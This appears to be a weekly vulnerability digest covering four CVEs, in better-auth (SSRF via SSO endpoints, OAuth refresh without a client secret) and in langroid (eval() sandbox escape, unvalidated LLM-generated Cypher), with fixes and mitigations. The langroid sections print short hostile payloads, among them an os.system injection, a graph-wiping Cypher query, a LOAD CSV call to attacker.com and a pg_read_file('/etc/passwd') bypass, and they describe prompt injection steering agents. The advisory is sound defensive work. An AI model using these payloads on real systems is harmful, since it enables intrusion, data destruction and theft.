Two critical CVEs in `better-auth` — the auth library powering a large slice of indie Next.js and React apps — are this week's most actionable items: the OIDC SSO plugin can be turned into an SSRF proxy, and the OAuth refresh endpoint skips client-secret verification entirely. Both are fixed in the same `1.6.11` release. AI-agent developers get a rougher week: `langroid` shipped a CVSS 10.0 sandbox-escape via a broken `eval()` guard, plus a second issue where its Neo4j integration passes LLM-generated Cypher straight to the driver. The theme is trust boundaries — in auth flows and in LLM-generated query paths.

## CVE-2026-53513 — better-auth SSO plugin turns your server into an SSRF proxy

`@better-auth/sso` ≥ 0.1.0, < 1.6.11 (npm) · CVSS 9.6

The `sso()` plugin's `/sso/register` and `/sso/update-provider` endpoints accept attacker-controlled OIDC URLs — `userInfoEndpoint`, `tokenEndpoint`, `jwksEndpoint` — and fetch them server-side with no origin validation. Any authenticated session can point these at `169.254.169.254` (AWS/GCP metadata), internal VPC services, or Supabase's internal API surface.

**Are you exposed?** If you have `sso()` in your `betterAuth({ plugins: [...] })` config and allow any authenticated user to register or update SSO providers, you're exposed. The risk jumps to full account takeover if `trustEmailVerified: true` is set, because the attacker can forge a verified email via their controlled `userInfoEndpoint` response.

**Fix:** `npm i @better-auth/sso@1.6.11` — this release adds URL validation via an `isPublicRoutableHost` gate that rejects RFC 1918 ranges, cloud-metadata IPs, and reserved blocks.

**If you can't patch:** Block POST to `/sso/register` and `/sso/update-provider` at your reverse proxy, or set `providersLimit: 0` in the SSO plugin config to disable self-registration entirely.

## CVE-2026-53512 — better-auth OAuth refresh skips client secret — refresh token theft = unlimited access tokens

`better-auth` < 1.6.11 (npm) · CVSS 9.1

The `oidcProvider()` and `mcp()` plugins expose OAuth token refresh endpoints that never verify the confidential client's `client_secret`. An attacker who obtains a refresh token — from logs, a token leak, or another vulnerability — can call the refresh endpoint with just the public `client_id` and receive valid access tokens indefinitely. The MCP plugin compounds this with a wildcard `Access-Control-Allow-Origin: *` CORS header on the token endpoint.

**Are you exposed?** You're exposed if you use `oidcProvider()` from `better-auth/plugins/oidc-provider` or `mcp()` from `better-auth/plugins/mcp` and have confidential OAuth clients registered (type `"web"`, `"native"`, or `"user-agent-based"`). Public clients using PKCE are not affected.

**Fix:** `npm i better-auth@1.6.11` — same patch release as CVE-2026-53513; apply once to cover both.

**If you can't patch:** Convert all confidential clients to public type with mandatory PKCE, or firewall the token endpoint to trusted IPs only.

## CVE-2026-54769 — langroid eval() sandbox escape, arbitrary OS command execution

`langroid` ≤ 0.65.1 (PyPI) · CVSS 10.0

`TableChatAgent` and `VectorStore` attempt to sandbox LLM-generated Python expressions with `eval(code, vars, {})`. The empty locals dict is supposed to block dangerous names, but Python still exposes `__builtins__` through the globals dictionary. A crafted prompt can inject `__import__('os').system('...')` and execute arbitrary commands on the host.

**Are you exposed?** You're exposed if you instantiate `TableChatAgent` or use any `VectorStore` component from `langroid` ≤ 0.65.1 with `full_eval=True`. The attack surface is any deployment where user-supplied input or RAG-retrieved content can reach the agent's tool message path — which is the normal operating mode for these components.

**Fix:** `pip install "langroid>=0.65.2"` — this version removes the broken `eval()` guard.

**If you can't patch:** Set `full_eval=False` in all agent configurations.

## CVE-2026-55615 — langroid Neo4jChatAgent runs LLM-generated Cypher with no validation

`langroid` ≤ 0.65.4 (PyPI) · CVSS 9.2

`Neo4jChatAgent` passes LLM-generated Cypher directly to the Neo4j driver — no statement-type allowlist, no opt-out gate. Both the read path (`cypher_retrieval_tool`) and write path (`cypher_creation_tool`) are affected. Injected queries can wipe the graph (`MATCH (n) DETACH DELETE n`), exfiltrate data, or trigger SSRF via `LOAD CSV FROM 'http://attacker.com/...'`. If APOC procedures are enabled on the database role, this escalates to OS command execution.

**Are you exposed?** If you use `Neo4jChatAgent` from `langroid` ≤ 0.65.4 and user input or external content can reach the agent, you're exposed. Note: upgrading to 0.65.5 also patches CVE-2026-54760 (SQLChatAgent blocklist bypass via quoted identifiers like `SELECT "pg_read_file"('/etc/passwd')`), so 0.65.5 is the right target for any langroid upgrade this week.

**Fix:** `pip install "langroid>=0.65.5"`

**If you can't patch:** Connect Neo4jChatAgent to a least-privilege database role with APOC disabled and `LOAD CSV` disallowed.
